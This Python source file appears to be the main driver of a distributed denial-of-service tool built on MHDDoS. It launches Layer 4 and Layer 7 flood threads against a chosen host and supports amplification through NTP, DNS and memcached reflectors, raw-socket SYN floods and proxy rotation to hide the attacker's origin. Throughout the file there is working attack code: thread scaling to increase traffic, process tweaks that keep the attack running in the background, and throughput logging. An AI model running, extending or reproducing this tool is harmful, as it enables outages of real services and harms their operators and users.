import ctypes
import os
import time
from contextlib import suppress
from dataclasses import dataclass
from json import load
from logging import basicConfig, getLogger, shutdown
from multiprocessing import Queue
from pathlib import Path
from socket import (gethostbyname)
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from typing import List

import psutil
from PyRoxy import Tools as ProxyTools
from yarl import URL

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.config_files import read_configuration_file_lines, read_configuration_file_text
from MHDDoS.utils.connectivity import connectivity_check_loop, ConnectivityState
from MHDDoS.utils.misc import Counter, get_last_from_queue
from MHDDoS.utils.proxies import ProxyManager, load_proxies, proxies_validation_thread, ProxiesValidationState
from MHDDoS.utils.targets import Target

# # TODO: log to stderr
# basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
#             datefmt="%H:%M:%S")
# logger = getLogger("MHDDoS")
# logger.setLevel("INFO")

__version__: str = "PALYANYTSYA"
__dir__: Path = Path(__file__).parent

from utils.logs import logger

bombardier_path: str = ""


UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time
CONNECTIVITY_CHECK_INTERVAL = 60  # TODO: make this a parameter of attack()?
PROXIES_CHECK_INTERVAL = 120  # TODO: make this a parameter of attack()?


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


@dataclass
class AttackState:
    # identification
    attack_pid: int

    # target
    target: Target

    # performance
    active_threads_count: int = None
    cpu_usage: float = None

    # proxies
    proxy_validation_state: ProxiesValidationState | None = None

    # connectivity
    connectivity_state: ConnectivityState | None = None

    # throughput
    total_requests_sent: int = None
    requests_per_second: int = None
    total_bytes_sent: int = None
    bytes_per_second: int = None
    time_since_last_packet_sent: float = None


last_counters_update_time = 0


def update_throughput_counters(rolling_packets_counter: Counter,
                               total_packets_counter: Counter,
                               rolling_bytes_counter: Counter,
                               total_bytes_counter: Counter) -> (float, float, float, float):
    global last_counters_update_time
    time_since_last_update = time.perf_counter() - last_counters_update_time
    last_counters_update_time = time.perf_counter()

    # update total request counts
    total_packets_counter += int(rolling_packets_counter)
    total_bytes_counter += int(rolling_bytes_counter)

    # save current stats
    pps = int(rolling_packets_counter) / time_since_last_update if time_since_last_update > 0 else 0
    bps = int(rolling_bytes_counter) / time_since_last_update if time_since_last_update > 0 else 0
    tp = int(total_packets_counter)
    tb = int(total_bytes_counter)

    # reset rolling counters
    rolling_packets_counter.set(0)
    rolling_bytes_counter.set(0)

    return pps, tp, bps, tb


def apply_process_modifications() -> psutil.Process:
    # FIX OPEN FILES LIMIT
    with suppress(ImportError):
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < hard:
            with suppress(Exception):
                resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))

    # LOWER PROCESS PRIORITY
    # this allows us to use other apps normally while the attack is running;
    # and if the CPU is free, attack will run with full performance anyway
    process = psutil.Process(os.getpid())
    if os.name == 'nt':
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    else:
        process.nice(19)

    return process


def attack(
        target: Target,
        attack_method: str,  # TODO: add option to use multiple attack methods
        proxies_file_path: str | None = "proxies/socks5.txt",
        user_agents_file_path: str | None = "user_agents.txt",
        referrers_file_path: str | None = "referrers.txt",
        reflectors_file_path: str | None = None,
        attack_state_queue: Queue = None
):
    # PREPARE PROCESS
    process = apply_process_modifications()

    # LOAD CONFIG FILES
    user_agents = read_configuration_file_lines(user_agents_file_path) if user_agents_file_path is not None else []
    referrers = read_configuration_file_lines(referrers_file_path) if referrers_file_path is not None else []
    proxies = load_proxies(proxies_file_path) if proxies_file_path is not None else []
    reflectors = None

    # PERFORM SANITY CHECKS
    # check attack method
    if attack_method not in Methods.ALL_METHODS:
        exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
    # check target
    if not target.is_valid():
        exit(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")
    # check Layer 4-specific conditions
    if attack_method in Methods.LAYER4_METHODS:
        # RAW SOCKET SUPPORT
        if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
            exit(f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")

        # REFLECTORS
        if reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
            if not reflectors_file_path:
                exit(f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")

            reflectors_text = read_configuration_file_text(reflectors_file_path)
            if reflectors_text is None:
                exit(f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

            reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
            if not reflectors:
                exit(f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

        # PROXIES WARNING
        if proxies is not None and len(proxies) > 0:
            if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
                logger.warning(f"{attack_method} attack method does not support proxies. {attack_method} attack connections will happen from your IP.")
    # check bombardier
    if attack_method == "BOMB":
        raise NotImplemented("'BOMB' method support is not implemented yet.")
        # TODO: (maybe) add support for BOMBARDIER
        global bombardier_path
        bombardier_path = Path(__dir__ / "go/bin/bombardier")
        assert (
                bombardier_path.exists()
                or bombardier_path.with_suffix('.exe').exists()
        ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"

    # INITIALIZE THREAD MANAGEMENT VARIABLES
    INITIAL_THREADS_COUNT = 1
    THREADS_MAX_LIMIT = 1
    THREADS_MIN_LIMIT = 1
    THREADS_STEP = 10
    attack_threads: List[Thread] = []
    attack_threads_stop_events: List[Event] = []

    # INITIALIZE THREAD MANAGEMENT FUNCTIONS
    def start_new_attack_thread():
        stop_event = Event()
        stop_event.clear()

        # TODO: select random attack method from the list (when there will be multiple)
        selected_attack_method = attack_method

        attack_thread = None
        if selected_attack_method in Methods.LAYER7_METHODS:
            attack_thread = Layer7(
                # TODO: handle portocols
                target=target.url,
                host=target.ip,
                method=selected_attack_method,
                rpc=UNLIMITED_RPC,
                synevent=stop_event,
                useragents=user_agents,
                referers=referrers,
                proxies=validated_proxies,
                bytes_sent_counter=cntr_rolling_bytes,
                requests_sent_counter=cntr_rolling_requests,
                last_request_timestamp=cntr_last_request_timestamp
            )
        elif selected_attack_method in Methods.LAYER4_METHODS:
            selected_proxies = validated_proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
            attack_thread = Layer4(
                target=(target.ip, target.port),
                ref=reflectors,
                method=selected_attack_method,
                synevent=stop_event,
                proxies=selected_proxies,
                bytes_sent_counter=cntr_rolling_bytes,
                requests_sent_counter=cntr_rolling_requests,
                last_request_timestamp=cntr_last_request_timestamp
            )
        else:
            exit(f"Invalid attack method ('{selected_attack_method}') selected when starting attack thread. Aborting execution.")

        attack_threads.append(attack_thread)
        attack_threads_stop_events.append(stop_event)

        attack_thread.start()
        stop_event.set()

    def stop_attack_thread():
        if len(attack_threads_stop_events) == 0:
            return

        thread_to_stop_event = attack_threads_stop_events.pop()
        thread_to_stop_event.clear()

    def increase_attack_threads():
        for _ in range(THREADS_STEP):
            if get_running_threads_count() >= THREADS_MAX_LIMIT:
                break
            start_new_attack_thread()

    def decrease_attack_threads():
        for _ in range(THREADS_STEP):
            if get_running_threads_count() <= THREADS_MIN_LIMIT:
                break
            stop_attack_thread()

    def get_running_threads_count() -> int:
        # clear any dead threads from the list
        for i, t in enumerate(attack_threads.copy()):
            if not t.is_alive():
                attack_threads_stop_events.pop(i)
                attack_threads.pop(i)

        return len(attack_threads_stop_events)

    # INITIALIZE STATUS UPDATE FUNCTION
    def post_status_update():
        if attack_state_queue is None:
            return

        attack_status = AttackState(
            attack_pid=process.pid,

            target=target,

            active_threads_count=get_running_threads_count(),
            cpu_usage=cpu_usage,

            proxy_validation_state=proxies_validation_state,
            connectivity_state=connectivity_state,

            total_requests_sent=tb,
            requests_per_second=pps,
            total_bytes_sent=tb,
            bytes_per_second=bps,
            time_since_last_packet_sent=time.time() - float(cntr_last_request_timestamp),
        )
        attack_state_queue.put(attack_status)

    # INITIALIZE COUNTERS
    cntr_rolling_requests = Counter()
    cntr_rolling_bytes = Counter()
    cntr_total_requests = Counter()
    cntr_total_bytes = Counter()
    cntr_last_request_timestamp = Counter(value_type=ctypes.c_double)
    pps, tp, bps, tb = update_throughput_counters(cntr_rolling_requests, cntr_total_requests, cntr_rolling_bytes, cntr_total_bytes)

    # INITIALIZE STATE MONITORING VARIABLES
    cpu_usage = process.cpu_percent()
    proxies_validation_state_queue = Queue()
    proxies_validation_state: ProxiesValidationState | None = None
    connectivity_state_queue = Queue()
    connectivity_state: ConnectivityState | None = None

    # FIND VALID PROXIES
    validated_proxies: List[Proxy] = []
    if proxies:
        proxies_validator = Thread(
            target=proxies_validation_thread,
            args=(proxies, target),
            kwargs={
                "interval": PROXIES_CHECK_INTERVAL,
                "status_queue": proxies_validation_state_queue
            }
        )
        proxies_validator.start()

        while True:
            time.sleep(0.1)

            proxies_validation_state: ProxiesValidationState = get_last_from_queue(proxies_validation_state_queue)

            if proxies_validation_state is not None:
                logger.info(f"Waiting for initial proxy validation to complete ({proxies_validation_state.progress * 100:.0f}%)...")

                if proxies_validation_state.is_validation_complete:
                    validated_proxies = proxies_validation_state.get_validated_proxies(proxies)
                    logger.info(f"Proxy validation completed. Found {proxies_validation_state.validated_proxies_count} valid proxies.")
                    if proxies_validation_state.validated_proxies_count == 0:
                        exit(f"Target cannot be reached through any of {len(proxies)} provided proxy servers. Attack will not be executed.")
                    break

    # START CONNECTIVITY MONITOR THREAD
    connectivity_monitor = Thread(
        target=connectivity_check_loop,
        args=(CONNECTIVITY_CHECK_INTERVAL, target, attack_method, proxies, connectivity_state_queue),
        daemon=True
    )
    connectivity_monitor.start()

    # ATTACK
    logger.info(f"Starting attack at {target} using {attack_method} attack method.")
    for _ in range(INITIAL_THREADS_COUNT):
        start_new_attack_thread()

    while True:
        time.sleep(0.5)

        tslr = time.time() - float(cntr_last_request_timestamp)
        cpu_usage = process.cpu_percent()

        # poll queues
        proxies_validation_state = get_last_from_queue(proxies_validation_state_queue)
        connectivity_state = get_last_from_queue(connectivity_state_queue)

        # update counters
        previous_pps = pps
        pps, tp, bps, tb = update_throughput_counters(cntr_rolling_requests, cntr_total_requests, cntr_rolling_bytes, cntr_total_bytes)

        ratio = pps / previous_pps if previous_pps > 0 else float("inf")
        THRESHOLD = 0.05
        # logger.info(f"{ratio} {ratio > 1 + THRESHOLD}")
        if ratio > 1 + THRESHOLD:  # TODO: use ratio
            increase_attack_threads()
        # elif ratio < 1:
        #     decrease_attack_threads()

        # TODO:
        #       - check CPU utilization
        #       - decrease/increase threads
        # step_up()
        #       - push attack status into the queue

        # generate attack status
        post_status_update()

        # log
        pps_string = Tools.humanformat(int(pps))
        bps_string = Tools.humanbytes(int(bps))
        tp_string = Tools.humanformat(int(tp))
        tb_string = Tools.humanbytes(int(tb))
        logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, tslr: {tslr*1000:.0f} ms, "
                    f"threads: {len(attack_threads_stop_events)}, cpu: {cpu_usage:.0f}%")


def start():
    # COUNTERS
    REQUESTS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_REQUESTS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()

    with open(__dir__ / "config.json") as f:
        config = load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                Tools.runConsole()
            if one == "STOP":
                Tools.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = Tools.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:

                # HANDLE PARAMETERS
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = Tools.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])

                # HANDLE PROXIES
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)

                # HANDLE BOMBARDIER
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")
                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                # HANDLE USERAGENTS
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                if not uagents: exit("Empty Useragent File ")

                # HANDLE REFERRERS
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                # TODO: manage threads actively
                for _ in range(threads):
                    Layer7(url, host, method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()

            if method in Methods.LAYER4_METHODS:
                # HANDLE PARAMETERS
                url = URL(urlraw)
                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not Tools.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = ProxyManager.validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = Tools.get_ip(urlraw)
            ip = host
            # health_check_thread = Thread(
            #     daemon=True,
            #     target=connectivity_check_loop,
            #     args=(CONNECTIVITY_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            # )
            # health_check_thread.start()

            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time.time()

            while time.time() < ts + timer:
                # log_attack_status()

                # update request counts
                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                TOTAL_BYTES_SENT += int(BYTES_SENT)
                REQUESTS_SENT.set(0)
                BYTES_SENT.set(0)

                # craft the status log message
                pps = Tools.humanformat(int(REQUESTS_SENT))
                bps = Tools.humanbytes(int(BYTES_SENT))
                tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
                tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
                logger.info(f"Total bytes sent: {tb}, total requests: {tp}")

                time.sleep(1)

            event.clear()
            exit()

        Tools.usage()


# def log_attack_status_new():
#     global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
#
#     # craft status message
#     message = "\n"
#     message += craft_performance_log_message()
#     message += craft_outreach_log_message(
#         is_first_health_check_done,
#         last_target_health_check_timestamp,
#         last_l4_result,
#         last_l4_proxied_results,
#         last_l7_response,
#         last_l7_proxied_responses
#     )
#
#     # log the message
#     if not status_logging_started:
#         status_logging_started = True
#     else:
#         message_line_count = message.count("\n") + 1
#         clear_lines_from_console(message_line_count)
#         # pass
#     print(message, end="")


# def craft_performance_log_message():
#     # craft the status log message
#     pps = Tools.humanformat(int(REQUESTS_SENT))
#     bps = Tools.humanbytes(int(BYTES_SENT))
#     tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
#     tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
#     status_string = f"Status:\n" \
#                     f"    Outgoing data:\n" \
#                     f"       Per second:\n" \
#                     f"          Packets/s: {pps}\n" \
#                     f"          Bytes/s:   {bps}\n" \
#                     f"       Total since the attack started:\n" \
#                     f"          Packets sent: {tp}\n" \
#                     f"          Bytes sent:   {tb}\n"
#
#     return status_string


if __name__ == '__main__':
    start()
